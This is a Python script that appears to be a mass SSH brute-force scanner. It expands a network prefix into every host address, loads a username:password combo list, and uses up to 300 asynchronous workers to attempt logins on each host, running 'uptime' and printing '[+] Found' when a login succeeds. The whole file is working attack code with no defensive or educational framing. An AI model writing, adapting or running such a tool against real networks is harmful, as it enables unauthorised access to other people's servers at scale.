import ipaddress
import asyncssh
import argparse
import asyncio
import random
import time

# debug, removing later
# also note: remove useless prints

import traceback

from pathlib import Path

def generate_range(ranges):
    splitted = ranges.split('.')
    netmask = len(splitted) * 8
    for i in range(len(splitted), 4):
        splitted.append('0')

    fmt = '.'.join(splitted)
    network = f'{fmt}/{netmask}'
    output = [str(x) for x in ipaddress.ip_network(network).hosts()]

    return output

def read_combo(file):
    check = Path(file)
    if not check.is_file():
        raise Exception('File is not in path. Make sure there is a combo list.')

    with open(file, 'r') as f:
        scan = f.read()

    combo = []
    for entry in scan.split():
        try:
            username, password = entry.split(':')
        except ValueError:
            raise Exception(f'Invalid combo list. ({entry})')

        entry = {'username': username, 'password': password}
        combo.append(entry)

    return combo

def chunk_list(seq, size):
    return (seq[i::size] for i in range(size))

async def run_ssh(ip, username, password):
    print(f'Trying {username}:{password} on {ip}..')
    async with (await asyncio.wait_for(asyncssh.connect(ip, username=username, password=password, known_hosts=None), timeout=timeout)) as conn:
        result = await conn.run('uptime', check=True)
        print(result.stdout)

async def brute_worker(name, queue):
    for combo in combos:
        check = await queue.get()

        # make custom exceptions and organize them
        
        for c in check:
            try:
                await run_ssh(c, combo['username'], combo['password'])
                print(f'[+] Found: {c}')
            except (OSError, asyncio.TimeoutError, ConnectionRefusedError):
                pass
            except (asyncssh.PermissionDenied, asyncssh.ConnectionLost):
                pass
            except Exception as e:
                traceback.print_exc()

    queue.task_done()

async def main(loop):
    queue = asyncio.Queue()

    tasks = []
    chunk_ranges = chunk_list(ranges, threads)
    for r in chunk_ranges:
        queue.put_nowait(r)

    for t in range(threads):
        task = loop.create_task(brute_worker(f'worker-{t}', queue))
        tasks.append(task)

    started_at = time.monotonic()
    await queue.join()
    total_slept_for = time.monotonic() - started_at

    for task in tasks:
        task.cancel()

    await asyncio.gather(*tasks, return_exceptions=True)
    print(f'Total elapsed: {total_slept_for:.2f} seconds')

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--range', '-r', type=str, required=True)
    parser.add_argument('--combo', '-c', type=str, required=True)
    parser.add_argument('--threads', type=int, default=300)
    parser.add_argument('--timeout', type=int, default=10)
    
    args = parser.parse_args()

    ranges = generate_range(args.range)
    combos = read_combo(args.combo)
    threads = args.threads
    timeout = args.timeout

    fmt = (f'Starting with {threads} threads\n'
    f'Generated {len(ranges)} IPs\n'
    f'Using {len(combos)} combinations\n'
    '=============================')
    print(fmt)

    time.sleep(2)
    loop = asyncio.get_event_loop()

    try:
        loop.run_until_complete(main(loop))
    except KeyboardInterrupt:
        print('Ok.')
    finally:
        loop.close()
